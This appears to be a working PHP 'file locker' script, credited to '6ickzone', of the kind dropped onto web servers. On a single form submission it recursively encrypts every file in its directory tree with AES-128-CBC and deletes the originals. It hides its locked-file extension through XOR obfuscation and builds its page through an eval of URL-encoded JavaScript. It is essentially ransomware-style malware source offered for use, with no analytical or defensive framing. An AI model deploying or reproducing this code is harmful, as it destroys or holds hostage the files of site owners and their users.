<?php
function _6kzone(){
  $x = ['(', '0', 'o', 'e', 'm']; //by 6ickzone - 6ickwhispers@gmail.com
  $dec = '';
  foreach($x as $c) $dec .= chr(ord($c) ^ 6);
  return $dec;
}
define('LOCKED_EXT', _6kzone());

// VALIDASI Eitszzzz
$_hx = hash('sha256', LOCKED_EXT);
if ($_hx !== '70e2c2855361f51d55e861ca100c428dfcef9aabbefbe4d4ed80e22ca60e1ce9') {
  die('Extension integrity check failed. Aborting...');
}

// === :V ===
$_A1=false; $_A2=0; $_A3='';

function _EN($_P1, $_P2, $_P3, &$_P4){
  $_EXC = ['encrypt.php', 'decrypt.php', basename(__FILE__)];
  foreach(scandir($_P1) as $_F){
    if($_F==='.'||$_F==='..') continue;
    $_FP = $_P1.'/'.$_F;
    if(is_dir($_FP)) _EN($_FP,$_P2,$_P3,$_P4);
    elseif(is_file($_FP)){
      if(in_array(basename($_FP),$_EXC)) continue;
      if(pathinfo($_FP,PATHINFO_EXTENSION)===ltrim($_P3,'.')) continue;
      $_D=file_get_contents($_FP);
      $_IV=openssl_random_pseudo_bytes(16);
      $_ENC=openssl_encrypt($_D,'AES-128-CBC',$_P2,OPENSSL_RAW_DATA,$_IV);
      $_OUT="6ickZone:".base64_encode($_IV.$_ENC);
      file_put_contents($_FP.$_P3,$_OUT);
      unlink($_FP); $_P4++;
    }
  }
}

function _DE($_Q1,$_Q2,$_Q3,&$_Q4){
  foreach(scandir($_Q1) as $_G){
    if($_G==='.'||$_G==='..') continue;
    $_GP = $_Q1.'/'.$_G;
    if(is_dir($_GP)) _DE($_GP,$_Q2,$_Q3,$_Q4);
    elseif(is_file($_GP)){
      if(pathinfo($_GP,PATHINFO_EXTENSION)!==ltrim($_Q3,'.')) continue;
      $_TXT=file_get_contents($_GP);
      if(strpos($_TXT,'6ickZone:')!==0) continue;
      $_B64=base64_decode(substr($_TXT,9));
      $_IV=substr($_B64,0,16);
      $_ENC=substr($_B64,16);
      $_PL=openssl_decrypt($_ENC,'AES-128-CBC',$_Q2,OPENSSL_RAW_DATA,$_IV);
      if($_PL!==false){
        $_ORIG=preg_replace('/'.preg_quote($_Q3,'/').'$/','',$_GP);
        file_put_contents($_ORIG,$_PL);
        unlink($_GP); $_Q4++;
      }
    }
  }
}

if(isset($_POST['lock'])){
  $_A3=bin2hex(random_bytes(8));
  _EN(__DIR__,$_A3,LOCKED_EXT,$_A2);
  $_A1='lock';
}
if(isset($_POST['decrypt_key'])){
  $_A3=$_POST['decrypt_key'];
  _DE(__DIR__,$_A3,LOCKED_EXT,$_A2);
  $_A1='unlock';
}
?>
<script>//awokwokwok
eval(decodeURIComponent('%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%60%3C%21%44%4F%43%54%59%50%45%20%68%74%6D%6C%3E%3C%68%74%6D%6C%3E%3C%68%65%61%64%3E%3C%74%69%74%6C%65%3E%30%78%36%69%63%6B%20%4C%6F%63%6B%65%72%3C%2F%74%69%74%6C%65%3E%3C%73%74%79%6C%65%3E%2A%7B%6D%61%72%67%69%6E%3A%30%3B%70%61%64%64%69%6E%67%3A%30%3B%62%6F%78%2D%73%69%7A%69%6E%67%3A%62%6F%72%64%65%72%2D%62%6F%78%7D%62%6F%64%79%7B%62%61%63%6B%67%72%6F%75%6E%64%3A%23%30%30%30%20%75%72%6C%28%27%68%74%74%70%73%3A%2F%2F%69%2E%69%6D%67%75%72%2E%63%6F%6D%2F%68%45%78%57%45%30%56%2E%6A%70%65%67%27%29%20%6E%6F%2D%72%65%70%65%61%74%20%63%65%6E%74%65%72%20%63%65%6E%74%65%72%20%66%69%78%65%64%3B%62%61%63%6B%67%72%6F%75%6E%64%2D%73%69%7A%65%3A%63%6F%76%65%72%3B%66%6F%6E%74%2D%66%61%6D%69%6C%79%3A%6D%6F%6E%6F%73%70%61%63%65%3B%68%65%69%67%68%74%3A%31%30%30%76%68%3B%64%69%73%70%6C%61%79%3A%66%6C%65%78%3B%61%6C%69%67%6E%2D%69%74%65%6D%73%3A%63%65%6E%74%65%72%3B%6A%75%73%74%69%66%79%2D%63%6F%6E%74%65%6E%74%3A%63%65%6E%74%65%72%3B%63%6F%6C%6F%72%3A%23%30%66%30%7D%2E%62%6F%78%7B%62%61%63%6B%67%72%6F%75%6E%64%3A%72%67%62%61%28%30%2C%30%2C%30%2C%2E%37%29%3B%70%61%64%64%69%6E%67%3A%33%30%70%78%3B%62%6F%72%64%65%72%3A%31%70%78%20%64%61%73%68%65%64%20%23%30%66%30%3B%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%31%30%70%78%3B%74%65%78%74%2D%61%6C%69%67%6E%3A%63%65%6E%74%65%72%3B%77%69%64%74%68%3A%39%30%25%3B%6D%61%78%2D%77%69%64%74%68%3A%35%30%30%70%78%3B%62%6F%78%2D%73%68%61%64%6F%77%3A%30%20%30%20%32%30%70%78%20%23%30%66%30%7D%69%6E%70%75%74%2C%62%75%74%74%6F%6E%7B%70%61%64%64%69%6E%67%3A%31%30%70%78%3B%6D%61%72%67%69%6E%3A%31%30%70%78%20%30%3B%62%61%63%6B%67%72%6F%75%6E%64%3A%23%30%30%30%3B%63%6F%6C%6F%72%3A%23%30%66%30%3B%62%6F%72%64%65%72%3A%31%70%78%20%73%6F%6C%69%64%20%23%30%66%30%3B%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%36%70%78%3B%77%69%64%74%68%3A%31%30%30%25%7D%62%75%74%74%6F%6E%3A%68%6F%76%65%72%7B%62%61%63%6B%67%72%6F%75%6E%64%3A%23%30%66%30%3B%63%6F%6C%6F%72%3A%23%30%30%30%3B%63%75%72%73%6F%72%3A%70%6F%69%6E%74%65%72%7D%2E%63%6F%64%65%7B%64%69%73%70%6C%61%79%3A%69%6E%6C%69%6E%65%2D%62%6C%6F%63%6B%3B%6D%61%72%67%69%6E%2D%74%6F%70%3A%31%30%70%78%3B%70%61%64%64%69%6E%67%3A%35%70%78%20%31%30%70%78%3B%62%61%63%6B%67%72%6F%75%6E%64%3A%23%31%31%31%3B%63%6F%6C%6F%72%3A%23%30%66%30%3B%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%35%70%78%7D%73%6D%61%6C%6C%7B%63%6F%6C%6F%72%3A%23%61%61%61%3B%6D%61%72%67%69%6E%2D%74%6F%70%3A%32%30%70%78%3B%64%69%73%70%6C%61%79%3A%62%6C%6F%63%6B%7D%3C%2F%73%74%79%6C%65%3E%3C%2F%68%65%61%64%3E%3C%62%6F%64%79%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%62%6F%78%22%3E%3C%68%31%3E%30%78%36%69%63%6B%20%46%69%6C%65%20%4C%6F%63%6B%65%72%3C%2F%68%31%3E%60%29'));
</script>
<?php if($_A1==='lock'): ?>
<p><strong>File terenkripsi:</strong> <?= htmlspecialchars($_A2) ?></p>
<p>KEY: <span class="code"><?= htmlspecialchars($_A3) ?></span></p>
<form method="POST">
  <input type="text" name="decrypt_key" placeholder="Masukkan kunci untuk dekripsi">
  <button type="submit">DECRYPT FILES</button>
</form>
<?php elseif($_A1==='unlock'): ?>
<p><strong>File didekripsi:</strong> <?= htmlspecialchars($_A2) ?></p>
<?php else: ?>
<form method="POST"><button type="submit" name="lock" value="1">LOCK FILES</button></form>
<form method="POST">
  <input type="text" name="decrypt_key" placeholder="Masukkan kunci untuk dekripsi">
  <button type="submit">DECRYPT FILES</button>
</form>
<?php endif; ?>
<small>Stealth version by <strong>Nyx6st - 6ickzone</strong> — 6ickwhispers@gmail.com</small>
</div></body></html>
